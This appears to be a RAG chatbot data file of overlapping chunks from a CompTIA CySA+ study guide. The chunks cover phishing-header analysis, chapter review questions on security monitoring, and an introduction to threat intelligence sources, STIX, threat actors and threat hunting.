rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	a suspected phishing email, you will need to open the headers for the email. If you’re not familiar with the process, most email providers have help available on how to access the headers. It can help to print the headers out for analysis or to import them into your favorite text editor to allow for markup as you track what you have found. Review the headers and identify what clues you can find about where it was sent from, who sent it, and what path it traveled before you received it. What red flags stand out, and what would you do to identify future phishing emails based on the header information? 130 Chapter 3 ■ Malicious Activity Part 2: Analyze the email content Now that you have reviewed the header, you can move on to the body of the email. In this phase, review the content of the message, paying particular attention to common artifacts found in phishing emails. You should look for embedded links and record any deceptive links or embeds. You can also identify typos, poor grammar, and other typical elements of a phishing email. Once you have identified these components, check the links against a tool like those found at http://zeltser.com/lookup-­malicious-­websites. Is the link or domain a known-­bad link? Part 3: Use an automated tool Use one or more automated email header analyzers to review the header from part 1. Note if you identify additional useful data and what that data is. Many sites are available; you can start with www.whatismyip.com/ email-­header-­analyzer/ or mxtoolbox.com/EmailHeaders.aspx. Review Questions 131 Review Questions 1. 2. 3. 4. 5. Which of the following Linux commands will show you how much disk space is in use? A. top B. df C. lsof D. ps What Windows tool provides detailed information, including information about USB host controllers, memory usage, and disk transfers? A. Statmon B. Resmon C. Perfmon D. Winmon What type of network information should you capture to be able to provide a report about how much traffic systems in your network sent to remote systems? A. Syslog data B. WMI data C. Resmon data D. Flow data Which of the following technologies is best suited to prevent wired rogue devices from connecting to a network? A. NAC B. PRTG C. Port security D. NTP As part of her job, Danielle sets an alarm to notify her team via email if her Windows server uses 80 percent of its memory and to send a text message if it reaches 90 percent utilization. What is this setting called? A. A monitoring threshold B. A preset notification level C. Page monitoring D. Perfmon calibration Chapter 3 132 6. 7. 8. 9. ■ Malicious Activity Chris is reviewing a file that is part of an exploit package. He notes that there is a file that has content with curly brackets ({}) around statements. What file type from the following list he most likely reviewing? A. Plain text B. JSON C. XML D. HTML What term describes
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	server uses 80 percent of its memory and to send a text message if it reaches 90 percent utilization. What is this setting called? A. A monitoring threshold B. A preset notification level C. Page monitoring D. Perfmon calibration Chapter 3 132 6. 7. 8. 9. ■ Malicious Activity Chris is reviewing a file that is part of an exploit package. He notes that there is a file that has content with curly brackets ({}) around statements. What file type from the following list he most likely reviewing? A. Plain text B. JSON C. XML D. HTML What term describes a system sending heartbeat traffic to a botnet command-and-control server? A. Beaconing B. Zombie ping C. CNCstatus D. CNClog Cameron wants to check if a file matches a known-­good original. What technique can he use to do so? A. Decrypt both the file and the original to compare them. B. Use strings to compare the file content. C. Hash both the file and the original and compare the hashes. D. Check the file size and creation date. What can the MAC address of a rogue device tell you? A. Its operating system version B. The TTL of the device C. What type of rogue it is D. The manufacturer of the device 10. How can Jim most effectively locate a wireless rogue access point that is causing complaints from employees in his building? A. Nmap B. Signal strength and triangulation C. Connecting to the rogue AP D. NAC 11. Which of the following tools does not provide real-­time drive capacity monitoring for Windows? A. Microsoft Configuration Manager B. Resmon C. SCOM D. Perfmon Review Questions 133 12. One of the business managers in Geeta’s organization reports that she received an email with a link that appeared to be a link to the organization’s HR website, and that the website it went to when she clicked on it was very similar to the organization’s website. Fortunately, the manager noticed that the URL was different than usual. What technique best describes a link that is disguised to appear legitimate? A. An obfuscated link B. A symbolic link C. A phishing link D. A decoy link 13. Angela wants to review the syslog on a Linux system. What directory should she check to find it on most Linux distributions? A. /home/log B. /var/log C. /log D. /var/syslog 14. Laura wants to review headers in an email that one of her staff is suspicious of. What should she not have that person do if she wants to preserve the headers? A. She shouldn’t have them print the email. B. She shouldn’t have them reply to the email. C. She shouldn’t have them forward the email to her. D. She shouldn’t have them download the email. 15. Which of the following is a key differentiator between a SIEM and a SOAR? A. A SIEM does not provide a dashboard. B. A SOAR provides automated response capabilities. C. A SOAR does not provide log aggregation. D.
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	in an email that one of her staff is suspicious of. What should she not have that person do if she wants to preserve the headers? A. She shouldn’t have them print the email. B. She shouldn’t have them reply to the email. C. She shouldn’t have them forward the email to her. D. She shouldn’t have them download the email. 15. Which of the following is a key differentiator between a SIEM and a SOAR? A. A SIEM does not provide a dashboard. B. A SOAR provides automated response capabilities. C. A SOAR does not provide log aggregation. D. A SIEM provides log analysis. 16. Which of the following options is not a valid way to check the status of a service in Windows? A. Use sc at the command line. B. Use service ––status at the command line. C. Use services.msc. D. Query service status using PowerShell. 17. Avik has been asked to identify unexpected traffic on her organization’s network. Which of the following is not a technique she should use? A. Protocol analysis B. Heuristics C. Baselining D. Beaconing Chapter 3 134 ■ Malicious Activity 18. Sofia suspects that a system in her datacenter may be sending beaconing traffic to a remote system. Which of the following is not a useful tool to help verify her suspicions? A. Flows B. A protocol analyzer C. SNMP D. An IDS or IPS 19. Susan wants to use an email security protocol to determine the authenticity of an email. Which of the following options will ensure that her organization’s email server can determine if it should accept email from a sender? A. DMARC B. SPF C. DKIM D. POP3 20. Juan wants to see a list of processes along with their CPU utilization in an interactive format. What built-­in Linux tool should he use? A. df B. top C. tail D. cpugrep Chapter 4 Threat Intelligence THE COMPTIA CYBERSECURITY ANALYST (CYSA+) EXAM OBJECTIVES COVERED IN THIS CHAPTER INCLUDE: ✓✓ Domain 1.0: Security Operations ■■ 1.4 Compare and contrast threat-­intelligence and threat-­hunting concepts ■■ Threat actors ■■ Tactics, techniques, and procedures (TTP) ■■ Confidence levels ■■ Collection methods and sources ■■ Threat intelligence sharing ■■ Threat hunting Security professionals of all types need to fully understand threats in order to prevent them or limit their impact. To do this, you need threat intelligence: data about your adversaries, their motivations, capabilities, as well as the tactics, techniques, and procedures they may use. In addition, you need information about what to look for when your adversaries succeed. Threat intelligence gathering relies on real-­world information gathering, evidence collection, and analysis. Threat intelligence can be categorized into three levels of intelligence. The first is strategic intelligence, which provides broad information about threats and threat actors allowing organizations to understand and respond to trends. Second, tactical threat intelligence includes more detailed technical and behavioral information that is directly useful to security professionals and others who are tasked with defense and response. Finally, operational threat intelligence is
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	well as the tactics, techniques, and procedures they may use. In addition, you need information about what to look for when your adversaries succeed. Threat intelligence gathering relies on real-­world information gathering, evidence collection, and analysis. Threat intelligence can be categorized into three levels of intelligence. The first is strategic intelligence, which provides broad information about threats and threat actors allowing organizations to understand and respond to trends. Second, tactical threat intelligence includes more detailed technical and behavioral information that is directly useful to security professionals and others who are tasked with defense and response. Finally, operational threat intelligence is composed of highly detailed information allowing response to a specific threat and often includes information about where it came from, who created it or how it has changed over time, how it is delivered or how it spreads, what it attempts to do, how to remove it, and how to prevent it. In this chapter, you will learn about the many types of threat intelligence, including sources and means of assessing the relevance and accuracy of a given threat intelligence source. There is a large threat intelligence community, and we will discuss sources that you can use in your work. We will also talk about threat classifications and threat actors. Finally, you will learn about how to apply threat intelligence across your organization as part of threat-­hunting activities. Threat Data and Intelligence There are many sources of threat intelligence ranging from open source intelligence (OSINT) that you can gather from publicly available sources to commercial services that provide proprietary or closed source intelligence information. An increasing number of products and services have the ability to consume threat feed data, allowing you to leverage it throughout your infrastructure and systems. Regardless of their source, threat feeds are intended to provide up-­to-­date details about threats in a way that your organization can leverage. Threat feeds often include details such as IP addresses, hostnames and domains, email addresses, URLs, file hashes, file paths, Common Vulnerabilities and Exposures (CVE) numbers, and other details about a threat. Additional information is often included to help make the information relevant and Threat Data and Intelligence 137 understandable, including details of what may make your organization a target or vulnerable to the threat, descriptions of threat actors, and even details of their motivations and methodologies. Open Source Intelligence Open source threat intelligence is threat intelligence that is acquired from publicly available sources. Many organizations have recognized how useful open sharing of threat information can be, and open source threat intelligence has become broadly available. In fact, now the challenge is often around deciding what threat intelligence sources to use, ensuring that they are reliable and up-­to-­date, and leveraging them well. A number of sites maintain extensive lists of open source threat information sources: ■■ ■■ ■■ ■■ Senki.org provides a list: www.senki.org/operators-­security-­toolkit/ open-­source-­threat-­intelligence-­feeds. The Open Threat Exchange operated by AlienVault is part of a global community of security professionals and threat researchers: https://cybersecurity.att.com/ open-­threat-­exchange. The MISP Threat Sharing
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	from publicly available sources. Many organizations have recognized how useful open sharing of threat information can be, and open source threat intelligence has become broadly available. In fact, now the challenge is often around deciding what threat intelligence sources to use, ensuring that they are reliable and up-­to-­date, and leveraging them well. A number of sites maintain extensive lists of open source threat information sources: ■■ ■■ ■■ ■■ Senki.org provides a list: www.senki.org/operators-­security-­toolkit/ open-­source-­threat-­intelligence-­feeds. The Open Threat Exchange operated by AlienVault is part of a global community of security professionals and threat researchers: https://cybersecurity.att.com/ open-­threat-­exchange. The MISP Threat Sharing project provides standardized threat feeds from many sources: www.misp-­project.org/feeds, with community-­driven collections. Threatfeeds.io hosts a list of open source threat intelligence feeds with details of when they were added and modified, who maintains them, and other useful information: https://threatfeeds.io. In addition to open source and community threat data sources, there are many government and public sources of threat intelligence data. For example, Figure 4.1 shows an alert listing from the CISA website. Government sites: ■■ The U.S. Cybersecurity and Infrastructure Security Agency (CISA) site: www.cisa .gov/uscert ■■ ■■ The U.S. Department of Defense Cyber Crime Center site: www.dc3.mil The CISA’s Automated Indicator Sharing (AIS) program, www.cisa.gov/ais, and their Information Sharing and Analysis Organizations (ISAOS) program, www.cisa.gov/ information-­sharing-­and-­analysis-­organizations-­isaos Vendor websites: ■■ Microsoft’s threat intelligence blog: www.microsoft.com/security/blog/tag/ threat-­intelligence ■■ Cisco’s threat security site includes an experts’ blog with threat research information, https://tools.cisco.com/security/center/home.x, as well as the Cisco Talos reputation lookup tool, https://talosintelligence.com 138 Chapter 4 FIGURE 4.1 ■ Threat Intelligence Alert listing from the CISA website Public sources: ■■ ■■ ■■ The SANS Internet Storm Center: https://isc.sans.org. VirusShare contains details about malware uploaded to VirusTotal: https:// virusshare.com. Spamhaus focuses on block lists, including spam via the Spamhaus Block List (SBL), hijacked and compromised computers on the Exploits Block List (XBL), the Policy Block List (PBL), the Don’t Route or Peer lists (DROP) listing netblocks that you may not want to allow traffic from, and a variety of other information: www.spamhaus.org. Many countries provide their own cybersecurity sites, like the Australian Signals Directorate’s Cyber Security Centre: www.cyber.gov.au. You should become familiar with major intelligence providers, worldwide and for each country you operate in or work with. The CySA+ exam outline also calls out a number of other open source intelligence sources you should keep in mind: Threat Data and Intelligence ■■ ■■ ■■ ■■ 139 Social media can provide very timely information but can also make it difficult to determine the veracity or origin of information. Identifying trusted sources and validating the information you receive from less trustworthy sources can take up significant time and resources. Blogs and forums are less commonly used than they were a few years ago but can still provide information. They remain a useful source for more in-­depth analysis and detail. Computer emergency response team (CERT) and cybersecurity incident response team (CSIRT) websites and organizations often provide public information via their websites and social media feeds. These can
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	■■ 139 Social media can provide very timely information but can also make it difficult to determine the veracity or origin of information. Identifying trusted sources and validating the information you receive from less trustworthy sources can take up significant time and resources. Blogs and forums are less commonly used than they were a few years ago but can still provide information. They remain a useful source for more in-­depth analysis and detail. Computer emergency response team (CERT) and cybersecurity incident response team (CSIRT) websites and organizations often provide public information via their websites and social media feeds. These can be particularly useful if you can identify industry aligned organizations that may face similar threats to those that your organization deals with. Finally, the dark, or deep, web can be a useful resource. Commercial data feeds often have both automated and human-­sourced intelligence information from threat actor forums and other locations that can be considered part of the dark web. As with all of these types of information, validating the information can be challenging, but visibility directly into conversations and data from threat actors can be incredibly valuable and timely. These are just some of the open source intelligence resources for security practitioners; they can give you a good idea of what is available. The “dark web” is typically defined as sites that are only accessible via Tor browsers. You can download the Tor browsers at www.torproject .org/download. The term “deep web” refers to parts of the Internet that aren’t easily found or indexed by mainstream search engines. This can include forums, closed sites, and other services that remain mostly hidden unless you know that they exist and how to access them. Proprietary and Closed Source Intelligence Commercial security vendors, government organizations, and other security-­centric organizations also create and use proprietary, or closed source intelligence. They do their own information gathering and research, and they may use custom tools, analysis models, or other proprietary methods to gather, curate, and maintain their threat feeds. They may share the information with others as part of an information sharing agreement or organization, as paid feeds, or they may keep the intelligence for internal use only. There are a number of reasons that proprietary threat intelligence may be used. The organization may want to keep their threat data secret, they may want to sell or license it and their methods and sources are their trade secrets, or they may not want to take the chance of the threat actors knowing about the data they are gathering. 140 Chapter 4 ■ Threat Intelligence Commercial closed source intelligence is often part of a service offering that can be a compelling resource for security professionals. The sheer amount of data available via open source threat intelligence feeds can be overwhelming for many organizations. Combing through threat feeds to identify relevant threats, then ensuring that they are both well defined and applied appropriately for your organization, can require massive amounts of effort. Validating threat data can be difficult
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	trade secrets, or they may not want to take the chance of the threat actors knowing about the data they are gathering. 140 Chapter 4 ■ Threat Intelligence Commercial closed source intelligence is often part of a service offering that can be a compelling resource for security professionals. The sheer amount of data available via open source threat intelligence feeds can be overwhelming for many organizations. Combing through threat feeds to identify relevant threats, then ensuring that they are both well defined and applied appropriately for your organization, can require massive amounts of effort. Validating threat data can be difficult in many cases, and once you are done making sure you have high-­quality threat data, you still have to do something with it! When a Threat Feed Fails The authors of this book learned a lesson about up-­to-­date threat feeds a number of years ago after working with an IDS and IPS vendor. The vendor promised up-­to-­date feeds and detects for current issues but tended to run behind other vendors in the marketplace. In one case, a critical Microsoft vulnerability was announced, and exploit code was available and in active use within less than 48 hours. Despite repeated queries, the vendor did not provide detection rules for over two weeks. Unfortunately, manual creation of rules on this vendor’s platform did not work well, resulting in exposure of systems that should have been protected. It is critical that you have reliable, up-­to-­date feeds to avoid situations like this. You may want to have multiple feeds that you can check against each other—­often one feed may be faster or release information sooner, so multiple good-­quality, reliable feeds can be a big help. Assessing Threat Intelligence Regardless of the source of your threat intelligence information, you need to assess it. A number of common factors come into play when you assess a threat intelligence source or a specific threat intelligence notification. Assessing these factors plays a role in determining the confidence level you or your organization has in the data. ■■ ■■ ■■ Is it timely? A feed that is operating on delay can cause you to miss a threat or to react after the threat is no longer relevant. Is the information accurate? Can you rely on what it says, and how likely is it that the assessment is valid? Does it rely on a single source or multiple sources? How often are those sources correct? Is the information relevant? If it describes the wrong platform, software, or reason for the organization to be targeted, the data may be very timely, very accurate, and completely irrelevant to your organization. Threat Data and Intelligence 141 Exam Note The CySA+ exam objectives call out timeliness, relevancy, and accuracy of intelligence sources, so you should be prepared to assess threat intelligence based on those factors as well as explain why they are important. One way to summarize the threat intelligence assessment data is via a confidence score. Confidence scores allow organizations to filter and use
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	are those sources correct? Is the information relevant? If it describes the wrong platform, software, or reason for the organization to be targeted, the data may be very timely, very accurate, and completely irrelevant to your organization. Threat Data and Intelligence 141 Exam Note The CySA+ exam objectives call out timeliness, relevancy, and accuracy of intelligence sources, so you should be prepared to assess threat intelligence based on those factors as well as explain why they are important. One way to summarize the threat intelligence assessment data is via a confidence score. Confidence scores allow organizations to filter and use threat intelligence based on how much trust they can give it. That doesn’t mean that lower confidence information isn’t useful; in fact, a lot of threat intelligence starts with a lower confidence score and that score increases as the information solidifies and as additional sources of information confirm it or are able to do a full analysis. Low confidence threat information shouldn’t be completely ignored, but it also shouldn’t be relied on to make important decisions without taking the low confidence score into account. Assessing the Confidence Level of Your Intelligence Many threat feeds will include a confidence rating, along with a descriptive scale. For example, ThreatConnect uses six levels of confidence: ■■ ■■ ■■ ■■ ■■ ■■ Confirmed (90–100) uses independent sources or direct analysis to prove that the threat is real. Probable (70–89) relies on logical inference but does not directly confirm the threat. Possible (50–69) is used when some information agrees with the analysis, but the assessment is not confirmed and is somewhat logical to infer from the given data. Doubtful (30–49) is assigned when the assessment is possible but not the most likely option, or the assessment cannot be proven or disproven by the information that is available. Improbable (2–29) means that the assessment is possible but is not the most logical option, or it is refuted by other information that is available. Discredited (1) is used when the assessment has been confirmed to be inaccurate or incorrect. You can read through all of ThreatConnect’s rating system at https://threatconnect .com/resource/evilness-­rating-­skulls-­scale-­for-­cyber-­threats-­4 Your organization may use a different scale: 1–5, 1–10, and High/Medium/Low scales are all commonly used to allow threat intelligence users to quickly assess the quality of the assessment and its underlying data. 142 Chapter 4 ■ Threat Intelligence Threat Intelligence Sharing Threat intelligence sharing often comes into play as part of security operations for organizations. In fact, threat intelligence sharing has a role to play in many key operational security practices: ■■ ■■ ■■ ■■ For incident response, threat intelligence is a key part of identifying threat actors as well as their common techniques and tools. Knowing what a threat actor is likely to deploy and how they commonly use their tools and techniques can make target identification, response planning, and cleanup all significantly easier. Vulnerability management efforts also leverage threat intelligence. Understanding current active threats can help security professionals to better assess risk and
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	comes into play as part of security operations for organizations. In fact, threat intelligence sharing has a role to play in many key operational security practices: ■■ ■■ ■■ ■■ For incident response, threat intelligence is a key part of identifying threat actors as well as their common techniques and tools. Knowing what a threat actor is likely to deploy and how they commonly use their tools and techniques can make target identification, response planning, and cleanup all significantly easier. Vulnerability management efforts also leverage threat intelligence. Understanding current active threats can help security professionals to better assess risk and influence patch cycles and prioritization efforts. Knowing that there is a zero-­day exploit of a widely deployed firewall device vendor’s current software version or that your organization’s preferred database has a flaw that is being attacked can make the difference between a typical patch cycle and an urgent, if risky update. Detection and monitoring rely heavily on threat intelligence information to allow timely updates and for the creation of new detection rules. Shared threat intelligence allows for faster responses and better behavioral detection capabilities and makes intelligence sharing communities more resilient. Security engineering efforts also take threat intelligence into account. While security engineering focuses on both current and future needs, threat intelligence can provide a useful view of the direction of threats and what threats are likely to grow over the life cycle of a security design. They can also influence responses to threats that may be integrated into design updates. Taken together, all of these uses of threat intelligence sharing are part of organizational risk management efforts. Modern organizations need to identify how they will acquire, consume, and respond to threat intelligence that is relevant to them. Acquiring, processing, and threat intelligence has become one of the major operational duties of many security operations team members. Exam Note Remember to consider five areas for the use of threat intelligence sharing for the exam: as part of incident response, for vulnerability management, as part of risk management, to influence security engineering, and as part of detection and monitoring efforts. Standards-­Based Threat Information Sharing Managing threat information at any scale requires standardization and tooling to allow the threat information to be processed and used in automated ways. Indicator management can be much easier with a defined set of terms. That’s where structured markup languages like STIX and OpenIOC come in. Threat Data and Intelligence 143 Structured Threat Information Expression (STIX) is an XML language originally sponsored by the U.S. Department of Homeland Security. STIX 2.1 (its current version as of this writing) defines 12 STIX domain objects, including things like attack patterns, identities, malware, threat actors, and tools. These objects are then related to each other by one of two STIX relationship object models: either as a relationship or as a sighting. A STIX 2.0 JSON description of a threat actor might read as follows: { "type": "threat-­ actor", "created": "2019-­ 10-­ 20T19:17:05.000Z", "modified": "2019-­ 10-­ 21T12:22:20.000Z", "labels": [ "crime-­ syndicate"],
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Data and Intelligence 143 Structured Threat Information Expression (STIX) is an XML language originally sponsored by the U.S. Department of Homeland Security. STIX 2.1 (its current version as of this writing) defines 12 STIX domain objects, including things like attack patterns, identities, malware, threat actors, and tools. These objects are then related to each other by one of two STIX relationship object models: either as a relationship or as a sighting. A STIX 2.0 JSON description of a threat actor might read as follows: { "type": "threat-­ actor", "created": "2019-­ 10-­ 20T19:17:05.000Z", "modified": "2019-­ 10-­ 21T12:22:20.000Z", "labels": [ "crime-­ syndicate"], "name": "Evil Maid, Inc", "description": "Threat actors with access to hotel rooms", "aliases": ["Local USB threats"], "goals": ["Gain physical access to devices", "Acquire data"], "sophistication": "intermediate", "resource_level": "government", "primary_motivation": "organizational-­ gain" } Fields like sophistication and resource_level use defined vocabulary options to allow STIX 2.0 users to consistently use the data as part of automated and manual systems. Using a single threat feed can leave you in the dark! Many organizations leverage multiple threat feeds to get the most up-­to-­date information. Thread feed combination can also be challenging since they may not use the same format, classification model, or other elements. You can work around this by finding sources that already combine multiple feeds, or by finding feeds that use the same description frameworks like STIX. Since its creation, STIX has been handed off to OASIS (the Organization for the Advancement of Structured Information Standards), an international nonprofit consortium that maintains many other projects related to information formatting, including XML and HTML. A companion to STIX is the Trusted Automated Exchange of Indicator Information (TAXII) protocol. TAXII is intended to allow cyber threat information to be communicated at the application layer via HTTPS. TAXII is specifically designed to support STIX data exchange. You can read more about both STIX and TAXII in detail at the OASIS GitHub documentation site: https://oasis-­open.github.io/cti-­documentation. Another option is the Open Indicators of Compromise (OpenIOC) format. Like STIX, OpenIOC is an XML-­based framework. The OpenIOC schema was developed by Mandiant, and it uses Mandiant’s indicators for its base framework. A typical IOC includes metadata like the author, the name of the IOC, and a description; references to the investigation or case and information about the maturity of the IOC; and the definition for the indicator of compromise, which may include details of the actual compromise. 144 Chapter 4 ■ Threat Intelligence We’ll cover IOCs in more detail a bit later in this chapter in the section “Indicators of Compromise.” Exam Note The Exam Outline doesn’t include STIX or TAXII, but we include it here because STIX and TAXII are things you’ll actually run into if you’re doing threat intelligence work, and acquiring many types of threat intelligence will involve using them. Fortunately, you shouldn’t run into a question directly about them on the exam. The Intelligence Cycle Threat intelligence well requires planning and forethought. Thus, many organizations adopt a threat intelligence life cycle, as shown in
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	Chapter 4 ■ Threat Intelligence We’ll cover IOCs in more detail a bit later in this chapter in the section “Indicators of Compromise.” Exam Note The Exam Outline doesn’t include STIX or TAXII, but we include it here because STIX and TAXII are things you’ll actually run into if you’re doing threat intelligence work, and acquiring many types of threat intelligence will involve using them. Fortunately, you shouldn’t run into a question directly about them on the exam. The Intelligence Cycle Threat intelligence well requires planning and forethought. Thus, many organizations adopt a threat intelligence life cycle, as shown in Figure 4.2. FIGURE 4.2 The threat intelligence cycle Gathering Feedback Requirements Gathering Threat Intelligence Dissemination Threat Data Collection Threat Data Analysis Planning Threat Intelligence: Requirements Gathering The first phase in the intelligence cycle is to plan for your intelligence requirements. Your requirements may be created as a result of successful breaches and compromises, industry Threat Data and Intelligence 145 trends, or risk assessments conducted for your organization. In this step you will typically do the following: ■■ Assess what security breaches or compromises you have faced. ■■ Assess what information could have prevented or limited the impact of the breach. ■■ Assess what controls and security measures were not in place that would have mitigated the breach. Data Collection Once you have your information requirements, you can collect data from threat intelligence sources to meet those requirements. This phase may repeat as additional requirements are added or as requirements are refined based on available data and data sources. Data Processing and Analysis The threat intelligence data that you gathered in the data collection stage will likely be in several different formats. Some may be in easy-­to-­access formats that your existing tools and systems can consume. Other data may be in plain text or written form, or it may be almost entirely unformatted. In this stage you must first process the data to allow it to be consumed by whatever tools or processes you intend to use, and then you must analyze the data itself. The output from this stage could be data fed into automated systems or other tools, or written reports to distribute to leadership or others across your organization. Intelligence Dissemination In the dissemination phase of the intelligence cycle, data is distributed to leadership and operational personnel who will use the data as part of their security operations role. Feedback The final stage in the threat intelligence cycle is gathering feedback about the reports and data you have gathered. Continuous improvement is a critical element in the process, and it should be used to create better requirements and to improve the overall output of your threat intelligence program. The Threat Intelligence Community In addition to threat intelligence vendors and resources, threat intelligence communities have been created to share threat information. In the United States, organizations known as Information Sharing and Analysis Centers (ISACs) help infrastructure owners and operators share threat information, as well as provide tools and assistance
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	role. Feedback The final stage in the threat intelligence cycle is gathering feedback about the reports and data you have gathered. Continuous improvement is a critical element in the process, and it should be used to create better requirements and to improve the overall output of your threat intelligence program. The Threat Intelligence Community In addition to threat intelligence vendors and resources, threat intelligence communities have been created to share threat information. In the United States, organizations known as Information Sharing and Analysis Centers (ISACs) help infrastructure owners and operators share threat information, as well as provide tools and assistance to their members. The National Council of ISACs lists the sector-­based ISACs at www.nationalisacs.org. The ISAC concept was introduced in 1998 as part of Presidential Decision Directive-­63 (PDD-­63), which asked critical infrastructure sectors to establish organizations to share information about threats and vulnerabilities. ISACs operate on a trust model, allowing 146 Chapter 4 ■ Threat Intelligence in-­depth sharing of threat information for both physical and cyber threats. Most ISACs operate 24/7, providing ISAC members in their sector with incident response and threat analysis. In addition to ISACs, there are specific U.S. agencies or department partners for each critical infrastructure area. A list breaking them down by sector can be found here: www.dhs .gov/cisa/critical-­infrastructure-­sectors. Outside the United States, government bodies and agencies with similar responsibilities exist in many countries. The UK’s Centre for the Protection of National Infrastructure (www .cpni.gov.uk) is tasked with providing threat information, resources, and guidance to industry and academia, as well as other parts of the government and law enforcement. Exam Note As you prepare for the exam, think about how you would collect open source intelligence from social media, blogs and forums, government bulletins, CERT and CSIRT organizations, and the dark web. Threat Classification Once you decide to assess the threats to your organization, you will quickly find that you need standard ways to describe them. Fortunately, there are a number of common descriptive schemes and terms used across the industry. Many organizations seek to describe both the threat actors and to classify the threats that they face to better understand the threats themselves. Threat Actors The CySA+ exam objectives specifically call out a few common threat actors: ■■ ■■ Nation-­state actors often have the most access to resources, including tools, talent, equipment, and time. Nation-­state threat actors have the resources of a country behind them, and their goals are typically those of the country they are sponsored by. Nation-­ state actors are often associated with advanced persistent threat (APT) organizations, and they have advanced tools and capabilities not commonly seen in the hands of other threat actors. Organized crime has played a significant role as a threat actor, with focused attacks typically aimed at financial gain. Ransomware attacks are an increasingly common example of this type of threat from organized crime groups. Threat Classification ■■ ■■ ■■ ■■ 147 Hacktivists are activists who use hacking as a means to a political or philosophical end. Hacktivists
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	and their goals are typically those of the country they are sponsored by. Nation-­ state actors are often associated with advanced persistent threat (APT) organizations, and they have advanced tools and capabilities not commonly seen in the hands of other threat actors. Organized crime has played a significant role as a threat actor, with focused attacks typically aimed at financial gain. Ransomware attacks are an increasingly common example of this type of threat from organized crime groups. Threat Classification ■■ ■■ ■■ ■■ 147 Hacktivists are activists who use hacking as a means to a political or philosophical end. Hacktivists range from individual actors to large groups like Anonymous, and their technical capabilities and resources can vary greatly. When you are assessing threats from hacktivists, you need to carefully consider what types of hacktivists are most likely to target your organization and why. Script kiddies are malicious actors who use preexisting tools, often in relatively unsophisticated ways. They can still be dangerous! Insider threats are threats from employees or other trusted individuals or groups inside an organization. They may be intentional or unintentional, but in either case, they can pose a significant threat due to the trusted position they have. Insider threats are frequently considered to be one of the most likely causes of breaches and are often difficult to detect. Supply chain threat actors may either act as part of the supply chain, inserting malicious software or hardware, compromising devices or inserting back doors, or they may attack the supply chain, disrupting the ability to obtain goods and services. Numerous supply chain attacks have been documented over the past few years, resulting in a greater focus on both validating the integrity of devices and software and on trusted supply chain efforts by both national and industry security organizations. Exam Note The CySA+ exam objectives break insider threats into two categories: intentional and unintentional. Make sure that you take that difference into account when you answer questions about insider threats on the exam. The exam outline also added supply chain threat actors and script kiddies in this version, a reflection of the increased awareness of threats to the supply chain seen since the last exam outline was published, and the common use of the term script kiddies to describe attackers using preexisting tools. Your organization may want to consider other specific threat actors based on your threat models and profile, so you should not consider this a complete list. You should conduct an organizational threat assessment to determine what types of threat actors are most likely to target your organization and why. Tactics, Techniques, and Procedures (TTP) While there are many types of threat actors, APTs are one of the most concerning attackers that an organization can face. As advanced persistent threats have been studied, they have been identified and classified based on their tactics, techniques, and procedures (TTP). 148 Chapter 4 ■ Threat Intelligence Countering APT activity successfully often relies on knowledge of their tactics, techniques, and procedures, making
rag-chatbot\data\CompTIA CySA+ Study Guide_ Exam CS0-003-Sybex.txt	so you should not consider this a complete list. You should conduct an organizational threat assessment to determine what types of threat actors are most likely to target your organization and why. Tactics, Techniques, and Procedures (TTP) While there are many types of threat actors, APTs are one of the most concerning attackers that an organization can face. As advanced persistent threats have been studied, they have been identified and classified based on their tactics, techniques, and procedures (TTP). 148 Chapter 4 ■ Threat Intelligence Countering APT activity successfully often relies on knowledge of their tactics, techniques, and procedures, making information about them exceptionally valuable. Common elements of each of these components are useful to understand. APT tactics can be analyzed when they start an attack by identifying how they begin their campaigns. That may include information gathering activities, initial probes, and social engineering efforts. Analysis of their commonly used infrastructure, attack techniques, and their compromise and cleanup processes can all help serve as identifying traits. Applying Threat Intelligence Organizationwide Building a comprehensive threat intelligence function requires multiple parts of an organization to work together. Security practitioners, system administrators, auditors, and others need to share data to identify threats, monitor for them, detect them using known activities and fingerprints, then respond to them, and finally use the information they have gained to prepare for future threats. Threat intelligence should be shared to ensure that incident response, vulnerability management, risk management, and security engineering functions understand the likely threat actors, capabilities, and indicators of compromise you will face. Proactive Threat Hunting Searching for threats proactively rather than reactively can help you stay ahead of attackers. Proactive threat hunting is often triggered by new data or tools that inspire threat analysts or security professionals to establish a hypothesis about a new threat, a new threat actor, or a new type of threat. Once you have a hypothesis, the next step is to investigate the threat. The confidence level analysis as well as the threat classification and TTP concepts we discussed earlier in this chapter can provide a foundation that will allow you to profile threat actors, to analyze malware or other tools by doing things like executable process analysis or reverse engineering, or to otherwise investigate the new threat. If a new threat is discovered, then some form of action is typically undertaken to counter the threat. You might identify a way to reduce your organization’s attack surface area, or you might find other ways to reduce the number of attack vectors available to attackers based on your threat analysis. Applying Threat Intelligence Organizationwide 149 Keys to this type of proactive activity are the use of integrated intelligence feeds from multiple sources, and improving your organization’s detection capabilities so that you can identity threats before they become a serious issue. You can think of proactive threat hunting as a process with steps that typically include: Establishing a Hypothesis A hypothesis is needed to test and should have actionable results based on the
